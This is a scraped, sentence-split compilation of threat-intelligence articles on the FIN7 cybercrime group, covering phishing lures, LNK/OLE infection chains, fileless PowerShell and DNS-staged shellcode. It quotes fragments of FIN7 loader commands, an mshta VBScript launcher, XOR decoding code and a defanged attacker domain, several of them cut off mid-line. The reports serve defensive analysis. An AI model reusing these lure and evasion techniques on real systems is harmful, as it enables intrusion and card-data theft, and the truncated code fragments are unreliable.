text: Embedded functionality is automatically extracted by Threat Grid, in this instance the embedded LNK OLE object contains seemingly malicious commands that are executed when clicked:Figure 20: Document LNK Command Prompt Static AttributesFigure 21: Active Document LNK Static AttributesThe OLE object can be clicked on within the document during the Threat Grid run using the Open Embedded Object in Word Document playbook, which will automatically execute the embedded object during the Threat Grid run when selected from the submission dropdown menu:Figure 22: Selecting Playbook from Submission MenuA depiction of this automated user interaction can be seen below:Figure 23: Clicking on Document OLE Object Through PlaybookWhen clicked additional behavioral indicators are triggered based on dynamic behavior:Figure 24: Dynamic Activity Caused by Clicking the OLE ObjectTask creations (used by the JavaScript bot for periodic execution of components) can also be observed:Figure 25: Task Creation Dynamic ActivityThe JavaScript content that is periodically executed can be seen the Artifacts section and can be downloaded or resubmitted for further analysis:Figure 26: Written JavaScript Artifact ObjectsThis intelligence is then integrated back into the AMP cloud protecting all customers who may be targeted by similar attack methodologies.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: AMP for Endpoints  AMP for Endpoints has the ability to observe dynamic activity through a number of methods.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: One of these is the capture of command line arguments which are then sent to the AMP cloud for analysis.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In this case, we're able to observe the execution of wscript.exe when the OLE object is clicked: Figure 27: Captured Command Line Arguments in AMP for Endpoints Device
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: TrajectoryThis triggers an Indicator of Compromise which can then be further investigated: Figure 28: Indicator of Compromise from Captured Command Line ArgumentsConclusion
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The FIN7 group is an example of an advanced adversary targeting a variety of industries using conventional technologies that ship with most versions of Microsoft Windows.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Through the use of Microsoft Word documents to ship entire malware platforms they have the ability to leverage scripting languages to access ActiveX controls, and "file-less" techniques to inject shipped portable executables into memory using PowerShell without ever having the portable executable touch disk.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Clustering JavaScript also demonstrates a number of ways FIN7 makes minor changes between releases, and establishes outliers to observe major changes.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Through the observation of static and dynamic attributes we're able to establish indicators of compromise based on the embedded OLE object which can be used to identify FIN7 documents, and identify documents which may be leveraging similar functionality to protect our customers.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

FIN7 Takes Another Bite at the Restaurant Industry

Posted by
Michael Gorelik on June 9, 2017

Find me on:

LinkedIn
Twitter 



















Share












INTRODUCTION
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: On June 7, 2017, Morphisec Lab identified a new, highly sophisticated fileless attack targeting restaurants across the US.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The ongoing campaign allows hackers to seize system control and install a backdoor to steal financial information at will.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: It incorporates some never before seen evasive techniques that allow it to bypass most security solutions – signature and behavior based.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Aside from these updated techniques, Morphisec’s investigation revealed an almost perfect match to FIN7 attack methods.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Past highly successful and damaging attacks on banks, SEC personnel, large restaurant chains and hospitality organizations have all been attributed to the financially-motivated FIN7 group.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: FIN7, which is also associated with the Carbanak gang, must be seen as one of the leading threat actor groups operating today.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The Word document executes a fileless attack that uses DNS queries to deliver the next shellcode stage (Meterpreter).
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: OpenDNS investigate data, shared in coordination with the Cisco Advanced Threat Research & Efficacy Team, shows that this is a large-scale, currently active attack with peaks of more than 10K DNS requests per hour.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: This means the attackers successfully bypass static analysis by most of the security solutions.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: By contrast, Morphisec’s Moving Target Defense-based technology prevents the attack in its early stages, before any channel to the attacker is opened.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
TECHNICAL ANALYSIS
Below we describe the full technical details, beginning with the initial email through the final Meterpreter session used to hijack the computer.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: PHISHING EMAIL:
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: As seen in the email below, FIN7’s attack campaign targets restaurants.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The content of the email is well crafted to avoid suspicion.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Some of the email attachments are called menu.rtf, others Olive Garden.rtf or Chick Fil A Order.rtf (all the identified hashes are listed at the end).
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: WORD DELIVERY:
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The attached .rtf file uses OLE and has many similarities to previous FIN7 attacks.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: But this attack, instead of activating hta files (mshta.exe) from within the link, executes obfuscated JavaScript code.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: All the victim needs to do is double click on the envelope and press OK.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: JAVASCRIPT CODE SNIPPETS:
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The first stage JavaScript copies additional JavaScript code snippets in txt format from the RTF document into a random directory “C:\Users\<User Name>\<Random guid>\”.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The same code snippets are combined into a second stage JavaScript in “C:\Users\<User Name>\”.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Additionally, the first stage JavaScript creates a scheduled task that executes the second stage code within a minute – this delayed execution helps to bypass behavior analysis since the second stage is not directly executed by the first stage.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
PERSISTENCY:
In some cases, an additional scheduled task “AdobeFlashSync” is created for persistency.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: This task is executed every 25 minutes and will repeat the actions described above – recreating the JavaScript code which later will create and execute a PowerShell script (described below).
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
SECOND STAGE JAVASCRIPT INTO POWERSHELL:
The second stage JavaScript creates a PowerShell file with the same name in the same directory.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Afterwards, it deletes its own JavaScript code traces.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques:
 
SHELLCODE:
The shellcode phase of this attack is unique and demonstrates the constantly advancing abilities of attackers.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The shellcode is the primary differentiating technique between this campaign and past attacks by FIN7 and other threat actors.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: This shellcode iterates over process environment block and looks immediately for dnsapi.dll name (xor 13) and its DnsQueryA function.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Basically, FIN7 implemented a shellcode that gets the next stage shellcode using the DNS messaging technique directly from memory.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: This way they can successfully evade many of the behavior based solutions.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
In the DNS query pattern, it is very clear to see that alphabetical modification of the subdomain prefix is used:

Each such DNS query results in an additional snippet of shellcode being appended to a reallocated buffer.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: When, finally, the first stage shellcode receives a special “FF” signal, it then executes the delivered shellcode.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: (It takes a few minutes for the DNS queries to finish.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
The last query is to the subdomain ihc[.]stage[.]12019683[.]ns2[.]true-deals[.]com):
 
The delivered second stage shellcode is encrypted:

METERPRETER:
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: After decryption of the second stage shellcode, the shellcode deletes the ‘MZ’ prefix from within a very important part of the shellcode.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: This prefix indicates it may be a dll, and its deletion helps the attack to evade memory scanning solutions.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Just before this step executed, we extracted the dll from memory and uploaded it to VirusTotal.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: If this dll was saved on disk, many security solutions would immediately identify it as a CobaltStrike Meterpreter, which is used by many attackers and pen testers.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Having a Meterpreter session on a compromised computer allows for full control of the computer and exfiltration of any data, and in some cases lateral movement inside the organization.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text:
CONCLUSIONS:
FIN7 constantly upgrades their attacks and evasion techniques, thus becoming even more dangerous and unpredictable.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: The analysis of this attack shows, how easy it is for them to bypass static, dynamic and behavior based solutions.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: These attacks pose a severe risk to enterprises.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Fileless attacks are on the rise – Carbon Black reports that researchers found a 33% rise in severe non-malware attacks in Q4 2016 compared to Q1.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Defenders will see more attacks on their businesses by hacker groups utilizing memory for evasion while keeping executable artifacts far away from disk.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: In this continuously evolving threat landscape, enterprises need to look for new defenses that are resilient to such changes and are able to prevent fileless attacks.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

text: Morphisec Endpoint Threat Prevention specializes in preventing in-memory attacks, using Moving Target Defense to make the target itself unpredictable.
source: FIN7 Takes Another Bite at the Restaurant Industry.html

								Fin7 weaponization of DDE is just their latest slick move, say researchers							

								High end cybercrime group FIN7 stays one step ahead of defenders by changing their lures within a couple days of being identified.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text:
By
Shaun Waterman



October 16, 2017






 
											(Getty)
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: When cybercrime gang FIN7 weaponized a new attack vector against Microsoft applications within a day of it being published last week, it was just the latest slick move from a threat group who’ve been consistently one step ahead of cyber defenders.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: A timeline of different attack vectors used by the group compiled by Morphisec researchers shows that FIN7 typically adopts a new technique within “a couple of days” of an attack being discovered, once the number of security solutions that detect it gets into double figures.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: The Morphisec researchers analyzed scoring of FIN7 attachment lures by VirusTotal — a service that scans files and tests them against 56 kinds of security software.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: “A look at Virus Total scoring reveals that when a FIN7 campaign is first active, is goes mostly undetected by security solutions.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: The malicious documents do not score more than 1-3 detections.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Within a couple of days, security solutions update their patterns and those documents score around 10/56 or higher,” according to their report.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Advertisement
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: But by that time, the authors write, FIN7 is already deploying new tools, by simply tweaking the code or other patterns that the security software is hunting for.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: This technique “diminishes the usefulness of reactive, pattern-based detection rules,” according to Morphisec.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Other researchers have analyzed FIN7’s tactics, noting that they follow a familiar pattern for skilled hackers: Initial compromise; establish foothold; escalate privileges; maintain presence; move laterally; and finally complete mission.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: The constant shifting of attack modes is “At the heart of FIN7’s business model,” the Morphisec researchers conclude.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: “Every campaign includes enough new features to make them unknowable …
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: And as security vendors scramble to catch up, FIN7 is already preparing its next attack.”
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Indeed, that swift adoption of new techniques caused one researcher at InfoSecurity Europe to comment of FIN7, “In most environments, prevention is not possible,” and detection is the best defenders can hope for.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Earlier this year, when FIN7 encountered a Morphisec researcher during an incident response, the group first blocked the IP he was using and then abandoned their entire command and control infrastructure.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text:
Advertisement




Such caution is worthy of a high-end financial cyber crime group thought to be behind many of the most audacious recent online bank thefts — including the one identified by Kaspersky dubbed “Take the money, b*tch!”
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: after a line of instructions in the code.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: The group were among the first to adopt super stealthy fileless malware — an attack method in which hackers eschew the download and installation of easily detectable malicious software.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Instead, they use tools already installed on the target’s own computers — powerful and widely trusted system and security programs like PowerShell or Metasploit — to inject their malicious code directly into the computer’s working memory.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: The commands to do this are typically hidden in an attachment, abusing a functionality like Visual Basic, Object Linking or — as in last week’s example — Dynamic Data Exchange or DDE.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: It is these attachment lures that the Morphisec researchers analyzed for their timeline.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: The lures rely on social engineering — Microsoft users will generally get a pop-up box asking them if they want to “enable content” or “update links” in the document they’re opening — and are typically spear-phished very carefully at a small number of targets.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text:
The kind of pop-up window displayed by malicious Word attachments using fileless malware


Advertisement




Earlier this year, FIN7 was suspected of being behind an attack that used emails appearing to come from the SEC’s Electronic Data Gathering, Analysis and Retrieval (EDGAR) online filing system.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text:
The emails bore a Microsoft Word attachment titled “Important changes to form 10K.”
A 10K is a form that public companies have to submit to the SEC every year, and the targets were people involved in their company’s filings — often meaning their email address was listed on public documents.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

text: Last week, researchers at Cisco Talos saw spear-phishing emails, with a similarly spoofed SEC address, bearing an attachment that used DDE to launch a “complex multi-stage infection process,” typical of FIN7.
source: Fin7 weaponization of DDE is just their latest slick move, say researchers - CyberScoop.html

Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader 



Vitali Kremez 

/


October 3, 2019





Vitali Kremez dissecting the ‘Fin7’ malware chain, which leverages malicious Office Macros and lightweight JS Loader scripts.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: “FIN7” is a financially motivated advanced persistent group operating out of Eastern Europe.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Since 2015, this group has continued to be extremely successful and formidable targeting various businesses seeking large-scale point-of-sale (PoS) compromises and network intrusion impacting global enterprises.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: The group is also known and notorious for its stealthy techniques and sophisticated and persistent approach.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Global corporations impacted by the group are primarily part of the restaurant, gaming, and hospitality industries.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Some of the victims of this group include such restaurant chains as Chipotle Mexican Grill, Chili’s, and Arby’s.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Source: DOJ
Most interestingly, this group used a front company “Combi Security” (reportedly based in Russia and Israel) to recruit various hackers to join their activities.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: This front company allowed the group to sustain their hacking activities and truly professionalized their hacking approach.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Despite the previous arrests of three members of the FIN7 group in January 2018, the group and/or its remnants still remained active on the financial crime landscape.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Source: DOJ
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: It is notable that the group still deploys lightweight JavaScript backdoor with communication over HTTPS mimicking Content Delivery Network (CDN) domains.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Additionally, they still leverage JavaScript backdoor via renamed wscript.exe with the actual JavaScript code called “errors.txt,” for example.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
FIN7: From First-Stage Microsoft Office VBA Macro Loader to JS Loader
The FIN7 Microsoft document loaders do not rely on any exploits but simply require a social engineering trick to “Enable Content” to activate macros.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Notably, to avoid process whitelisting of wscript, the macro logic copies the original JavaScript execution engine wscript.exe in %LOCALAPPDATA% and leverages a possible anti-analysis routine of checking the system drive size via GetDrive.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: TotalSize of more than 2456 bytes to possibly thwart anti-sandbox check.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: The actual obfuscated Javascript backdoor is stored in UserForm object, which is also written to a disc as “errors.txt” in %TEMP%.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
The final execution of the backdoor is performed via this following command:
%LOCALAPPDATA%mses.exe //b /e:
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: jscript %
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
temp%errors.txt
Once it is done, the document macro runs a message box displaying “Decryption error” via MsgBox("Decryption error").
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Reversing Steps:
1.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Extract the VBA macro via olevba;

2.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Debug in Office VBA to retrieve decoded script;

3.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Extract and prettify obfuscated JavaScript backdoor from userform object;

4.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Modify JS code close to eval() and run script via Internet Explorer debugger, for example; 
5.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: Debug, extract and beautify the full FIN7 JS backdoor.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: FIN7 JS Loader/Backdoor XOR Encryption & Custom Encoding
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: The crypt_controller function accepts two parameters of type and request.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: a.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: If type parameter equals “decrypt”, the request is processed via decodeURIComponent splitting the request with separator ")*(" and then retrieving encryption_key(second element[1]) from split request.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: If there’s no encryption_key split, it pulls it as a random value via (Math.floor(Math.random() * 9000)
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: + 1000).toString().split("");.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: The decoding routine is a simple XOR loop decoding the content as follows joining the result_string via .join command.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: var output =
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html
Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: = request.charCodeAt(i) ^
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html
Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: If type parameter equals “encrypt”,  the result_string is joined with ")*(" and passed to encodeURIComponent.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
FIN7 Second-Stage Machine & Network Profiling Script
In the aftermath of the initial call, the group deploys a custom “profiling” script meant to fingerprint the machine and the network environment more closely.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text: The malware checks for the presence of virtual machine, queries active directory, operating system, screen resolution, user account control (UAC) level, and retrieves a process list.
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Finally, it formats the data and appends to “action=add_info” request, which is sent to the server.
 
Indicators of Compromise (IOCs):
source: Deep Insight into “FIN7” Malware Chain_ From Office Macro Malware to Lightweight JS Loader - SentinelLabs.html

text:
Hackers Accelerate Pace of Innovation

Posted by
Michael Gorelik on October 13, 2017

Find me on:

LinkedIn
Twitter 



















Share











 

PLEASE DOWNLOAD THE DETAILED ATTACK ANALYSIS IN PDF HERE
Like clockwork, FIN7 again unleashed a new attack able to bypass almost every security solution.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: The attack, which took place between October 8 to 10, 2017, is yet another demonstration of the high-paced innovation by threat actors.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: FIN7 is one of today’s most organized and sophisticated cybercrime groups, primarily known for targeting US businesses to steal payment card data.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: They typically use clever, customized spear-phishing lures with malicious attachments.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: Once an organization is infected, they move laterally across the network, using various anti-forensic techniques to evade detection.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: The group is closely tied to the notorious Carbanak Gang, responsible for a slew of attacks against financial institutions, although so far evidence falls short of directly equating the two.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: Over the past year, Morphisec has been closely monitoring FIN7 and their targets, publishing several analyses on methods used by this group.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: In June 2017 Morphisec identified a highly sophisticated fileless attack targeting restaurants across the US, as discussed on Morphisec’s blog and in a post co-authored with Cisco Talos.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: The June campaign used a new stealer DLL variant injected into malicious documents.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: In this report we take a broader approach, describing in detail the rapid dynamic changes over the course of the last four months, including the recent October attack, which was first documented by researchers at Icebrg.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: We examine each of the component modifications in the attack chains, and show how those changes helped FIN7 evade the dynamic behavior patterns and static patterns applied by many security solutions.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: In fact, a presentation on FIN7 by FireEye at this year’s InfoSecurity Europe  stated that “In most environments, prevention is not possible.”
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text: The presenters, however, did not take into account the effectiveness of Moving Target Defense solutions (e.g. Morphisec Endpoint Threat Prevention solution) against these types of attacks.
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text:
The technical analyses, available for download here, discusses:


DOCUMENT STRUCTURE


STAGE 1: LNK FILE – OLE OBJECT


LNK FILE – PROPERTIES CODE CONTENT


LNK FILE – FILE DETAILS / BATCH FILE DETAILS


STAGE 2 – OLE AUTOMATION


SHAPE.TEXTFRAME.TEXT


STAGE 3 – SCHEDULED TASKS


STAGE 4 – NETWORK
source: FIN7 Dissected_ Hackers Accelerate Pace of Innovation.html

text:
BASED DETECTION EVASION


STAGE 5 - POWERSHELL – REFLECTIVE DLL INJECTION


YOU CAN DOWNLOAD THE PDF OF THE DETAILED REPORT HERE.

text: Gives BackNoteholder and Preferred Shareholder DocumentsMobile Footer SectionSee what’s new at MandiantGet startedIncident Response HelpContact SalesSupportSign InCreate a Free Mandiant Advantage AccountTop Incident Response Contact sales Support Advantage Free Trial  BlogSupportContact usreport_problemIncident Response Assistance    Breadcrumb Home FIN7 Evolution and the Phishing LNK   Threat Research FIN7 Evolution and the Phishing LNKNick Carr, Saravanan Mohankumar, Yogesh Londhe, Barry Vengerik, Dominik Weber Apr 24, 20175 min read |    Last updated: Nov 29, 2023 MalwareFIN7 is a financially-motivated threat group that has been associated with malicious operations dating back to late 2015.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: FIN7 is referred to by many vendors as “Carbanak Group”, although we do not equate all usage of the CARBANAK backdoor with FIN7.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: FireEye recently observed a FIN7 spear phishing campaign targeting personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: In a newly-identified campaign, FIN7 modified their phishing techniques to implement unique infection and persistence mechanisms.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: FIN7 has moved away from weaponized Microsoft Office macros in order to evade detection.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: These lures originate from external email addresses that the attacker rarely re-used, and they were sent to various locations of large restaurant chains, hospitality, and financial service organizations.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: The subjects and attachments were themed as complaints, catering orders, or resumes.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: As with previous campaigns, and as highlighted in our annual M-Trends 2017 report, FIN7 is calling stores at targeted organizations to ensure they received the email and attempting to walk them through the infection process.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: Infection ChainWhile FIN7 has embedded VBE as OLE objects for over a year, they continue to update their script launching mechanisms.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: In the current lures, both the malicious DOCX and RTF attempt to convince the user to double-click on the image in the document, as seen in Figure 1.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: This spawns the hidden embedded malicious LNK file in the document.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: Overall, this is a more effective phishing tactic since the malicious content is embedded in the document content rather than packaged in the OLE object.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: By requiring this unique interaction – double-clicking on the image and clicking the “Open” button in the security warning popup – the phishing lure attempts to evade dynamic detection as many sandboxes are not configured to simulate that specific user action.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: Figure 1: Malicious FIN7 lure asking victim to double click to unlock contentsThe malicious LNK launches “mshta.exe” with the following arguments passed to it:vbscript:Execute("On
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: Error Resume Next:set w=GetObject(,""Word.Application""):execute w.ActiveDocument.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html

text: Shapes(2).TextFrame.
source: FIN7 Evolution and the Phishing LNK _ Mandiant.html
